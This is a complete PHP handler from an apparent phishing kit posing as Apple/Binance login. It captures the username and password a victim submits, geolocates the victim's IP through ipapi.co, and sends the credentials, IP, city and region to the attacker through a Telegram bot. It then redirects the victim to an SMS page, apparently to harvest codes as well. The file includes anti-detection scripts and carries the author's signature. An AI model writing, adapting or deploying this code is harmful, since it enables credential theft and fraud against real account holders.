<?php
		include "../antired_flag/anti1.php";
		include "../antired_flag/anti2.php"; 
		include "../antired_flag/anti3.php"; 
		include "../antired_flag/anti4.php"; 
		include "../antired_flag/anti5.php"; 
		include "../antired_flag/anti7.php";
    $x = "UysnX"; // Change To Anythings <3 
	session_start();
	include 'xuysnx.php';
	$user=$_POST['usr']; 
	$pwd=$_POST['pwd'];
	function getUserIP()
	{
		if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
				  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
				  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
		}
		$client  = @$_SERVER['HTTP_CLIENT_IP'];
		$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
		$remote  = $_SERVER['REMOTE_ADDR'];
	
		if(filter_var($client, FILTER_VALIDATE_IP))
		{
			$ip = $client;
		}
		elseif(filter_var($forward, FILTER_VALIDATE_IP))
		{
			$ip = $forward;
		}
		else
		{
			$ip = $remote;
		}
	
		return $ip;
	}
	$user_ip = getUserIP();
	$city = file_get_contents("https://ipapi.co/$user_ip/city/" );
	$zip = file_get_contents("https://ipapi.co/$user_ip/postal/" );
	$zip = file_get_contents("https://ipapi.co/$user_ip/region/" );
$msg = "
♜ Apple-Binance-RSLT ♜
┏━━━━━━━━━━━━━━
♜ USER : {$user}
♜ PWD : {$pwd}
┗━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━
♜IP : 🌍 {$user_ip} 🌍
♜CITY : 🌍 {$city} 🌍
♜ZIP : 🌍 {$zip} 🌍
┗━━━━━━━━━━━━━━
╚═★ 𝘽𝙮 𝙐𝙮𝙣𝙨𝙓 ★═╝
";

file_get_contents("https://api.telegram.org/bot" . $api . "/sendMessage?chat_id=" . $chatid . "&text=" . urlencode($msg) . "");


exit(header("Location: ../sms/"));
	
?>